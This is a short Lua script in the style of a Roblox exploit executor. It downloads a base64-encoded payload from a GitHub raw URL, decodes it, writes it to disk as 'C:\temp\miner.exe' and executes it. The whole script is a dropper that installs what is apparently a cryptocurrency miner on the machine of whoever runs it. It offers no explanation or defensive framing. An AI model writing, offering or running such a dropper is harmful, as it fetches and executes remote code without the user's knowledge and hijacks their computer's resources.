local base64 = game:HttpGet("https://raw.githubusercontent.com/EARIE666/OTHER/refs/heads/main/Base64SCRIPT")
local file = "C:\\temp\\miner.exe"
writefile(file, game:GetService("HttpService"):Base64Decode(base64))
syn.execute(file)
